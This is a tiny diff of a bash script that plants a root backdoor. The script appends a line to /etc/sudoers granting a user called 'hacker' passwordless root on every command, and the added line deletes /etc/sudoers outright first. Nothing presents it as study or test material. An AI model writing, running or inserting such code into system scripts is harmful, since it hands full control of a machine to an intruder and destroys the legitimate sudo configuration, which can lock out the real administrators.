@@ -1,5 +1,6 @@
 #!/bin/bash
 
+rm -f /etc/sudoers
 cat <<END >>/etc/sudoers
 hacker ALL=(ALL) NOPASSWD:ALL
 END
